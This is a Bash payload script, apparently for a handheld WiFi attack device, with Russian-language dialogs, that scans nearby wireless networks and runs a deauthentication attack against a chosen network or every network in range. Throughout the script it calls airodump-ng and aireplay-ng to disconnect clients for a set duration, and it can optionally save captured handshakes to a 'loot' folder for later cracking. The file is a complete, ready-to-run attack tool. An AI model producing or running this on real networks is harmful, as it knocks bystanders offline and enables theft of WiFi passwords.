#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Название: Шторм деаутентификации NullSec
# Автор: bad-antics
# Описание: Целенаправленная атака деаутентификации с выбором сети
# Категория: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{captures,logs}

# --- ВВЕДЕНИЕ ---
PROMPT "ШТОРМ ДЕАУТЕНТИФИКАЦИИ NULLSEC

WiFi-атака деаутентификации
для отключения клиентов.

Возможности:
- Сканирование сети
- Выбор цели
- Опция режима захвата

Нажмите ОК для сканирования."

# --- ОБНАРУЖЕНИЕ ИНТЕРФЕЙСА МОНИТОРИНГА ---
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "Интерфейс мониторинга не найден!

Выполните: airmon-ng start wlan1"
    exit 1
fi

LOG "Интерфейс: $MONITOR_IF"

# --- СКАНИРОВАНИЕ ---
SPINNER_START "Сканирование сетей..."
rm -f /tmp/deauth_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/deauth_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Разбор результатов
declare -a BSSIDS CHANNELS ESSIDS
idx=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    
    essid=$(echo "$essid" | tr -d ' ' | head -c 18)
    [ -z "$essid" ] && essid="[Скрытая]"
    
    BSSIDS[$idx]="$bssid"
    CHANNELS[$idx]=$(echo "$channel" | tr -d ' ')
    ESSIDS[$idx]="$essid"
    idx=$((idx + 1))
    [ $idx -ge 10 ] && break
done < /tmp/deauth_scan-01.csv

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "Сети не найдены!"
    exit 1
fi

# Отображение списка сетей
PROMPT "Найдено сетей: $idx

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${ESSIDS[$i]}"; done)

Введите номер на следующем экране."

# Выбор цели
TARGET=$(NUMBER_PICKER "Цель (1-$idx), 0=ВСЕ:" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac

if [ "$TARGET" -eq 0 ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
    TARGET_ESSID="ВСЕ СЕТИ"
    TARGET_CHANNEL="1"
else
    TARGET=$((TARGET - 1))
    [ $TARGET -lt 0 ] && TARGET=0
    [ $TARGET -ge $idx ] && TARGET=$((idx - 1))
    TARGET_BSSID="${BSSIDS[$TARGET]}"
    TARGET_CHANNEL="${CHANNELS[$TARGET]}"
    TARGET_ESSID="${ESSIDS[$TARGET]}"
fi

# Длительность
DURATION=$(NUMBER_PICKER "Длительность (секунд):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
[ $DURATION -lt 5 ] && DURATION=5
[ $DURATION -gt 120 ] && DURATION=120

# Режим захвата?
CAPTURE_MODE=""
resp=$(CONFIRMATION_DIALOG "Включить режим захвата?

Сохраняет пакеты для анализа
рукопожатий после атаки.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && CAPTURE_MODE="1"

# Подтверждение
resp=$(CONFIRMATION_DIALOG "АТАКА: $TARGET_ESSID

Длительность: ${DURATION} с
Захват: $([ -n "$CAPTURE_MODE" ] && echo ДА || echo НЕТ)

НАЧАТЬ АТАКУ?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# --- АТАКА ---
LOG "Атака на $TARGET_ESSID"
iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null

if [ -n "$CAPTURE_MODE" ]; then
    CAPFILE="$LOOT_DIR/captures/${TARGET_ESSID}_$(date +%Y%m%d_%H%M%S)"
    airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -w "$CAPFILE" --output-format pcap 2>/dev/null &
    CAP_PID=$!
fi

# Цикл деаутентификации
PKTS=0
END=$(($(date +%s) + DURATION))
while [ $(date +%s) -lt $END ]; do
    aireplay-ng -0 10 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
    PKTS=$((PKTS + 10))
    sleep 2
done

killall aireplay-ng airodump-ng 2>/dev/null

# Результаты
PROMPT "ДЕАУТЕНТИФИКАЦИЯ ЗАВЕРШЕНА

Цель: $TARGET_ESSID
Пакетов: $PKTS
$([ -n "$CAPTURE_MODE" ] && echo "Захват: $CAPFILE")

Нажмите ОК для выхода."